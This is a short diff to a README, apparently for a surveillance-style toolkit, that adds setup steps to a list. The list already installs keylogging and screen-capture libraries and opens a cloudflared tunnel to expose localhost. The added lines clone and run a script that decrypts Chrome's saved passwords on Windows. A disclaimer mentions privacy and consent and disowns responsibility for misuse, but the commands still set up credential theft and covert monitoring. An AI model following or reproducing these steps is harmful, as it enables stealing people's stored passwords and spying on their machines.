@@ -15,6 +15,12 @@ It emphasizes privacy, consent, and governance. **No code or instruction that en
 - pip install sounddevice numpy scipy keyboard pynput opencv-python pyautogui
 - pip install sounddevice numpy scipy keyboard pynput opencv-python pyautogui pillow
 - pip install mss
+- https://github.com/ohyicong/decrypt-chrome-passwords.git
+- cd decrypt-chrome-passwords
+- ls
+- pip install pycryptodomex
+- pip install pywin32
+- python decrypt_chrome_password.py
 - cloudflared.exe tunnel --url http://localhost:80
 - The repository owner and contributors are **not responsible** for misuse.
 
